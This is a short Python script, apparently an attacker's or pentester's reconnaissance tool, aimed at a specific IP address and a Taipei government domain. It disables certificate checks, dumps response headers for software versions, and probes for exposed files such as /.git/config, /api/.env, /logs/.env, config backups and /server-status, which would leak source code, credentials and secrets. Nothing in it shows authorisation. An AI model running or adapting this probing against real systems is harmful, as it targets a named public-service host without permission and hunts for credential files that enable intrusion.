#!/usr/bin/env python3
"""
Deep server configuration analysis
"""

import requests
import re
import socket
import json

TARGET = "https://210.69.42.55"
sess = requests.Session()
sess.verify = False

print("=== DNS & IP Analysis ===")

# Resolve IP
import socket
try:
    ip = socket.gethostbyname("www.af-search.119.gov.taipei")
    print(f"Resolved IP: {ip}")
except:
    print("Could not resolve domain")

# Check reverse DNS
try:
    rdns = socket.gethostbyaddr("210.69.42.55")
    print(f"Reverse DNS: {rdns}")
except:
    pass

# Check for internal IPs based on header leakage
r = requests.get(TARGET + "/", timeout=10)
print(f"\n=== Headers ===")
for k, v in r.headers.items():
    print(f"{k}: {v}")

# Check for Server header
server = r.headers.get('Server', '')
if server.lower() in ['apache', 'nginx', 'litespeed', 'cloudflare']:
    print(f"\n[!] Server: {server}")

# Check for X-Powered-By
powered = r.headers.get('X-Powered-By', '')
if powered:
    print(f"[!] X-Powered-By: {powered}")

# Check for X-AspNet-Version
aspnet = r.headers.get('X-AspNet-Version', '')
if aspnet:
    print(f"[!] X-AspNet-Version: {aspnet}")

print(f"\n=== Hidden Paths via Directory Brute Force ===")

# Common hidden paths
hidden_paths = [
    "/.well-known", "/.well-known/acme-challenge",
    "/.svn/", "/.git/", "/.hg/", "/.bzr/",
    "/backup", "/backups", "/db", "/database",
    "/data", "/config.bak", "/config.old",
    "/admin/.git/config", "/.git/config",
    "/server-status", "/server-info",
    "/api/.env", "/.htaccess", "/web.config",
    "/logs/.env", "/tmp", "/cache"
]

for path in hidden_paths:
    try:
        r = sess.get(TARGET + path, timeout=5, allow_redirects=False)
        if r.status_code != 404:
            print(f"{path}: {r.status_code} ({len(r.text)} bytes)")
            # Check if it's an error page or actual content
            if len(r.text) < 500 and 'doctype' not in r.text.lower():
                print(f"  -> Possible actual response")
    except Exception as e:
        pass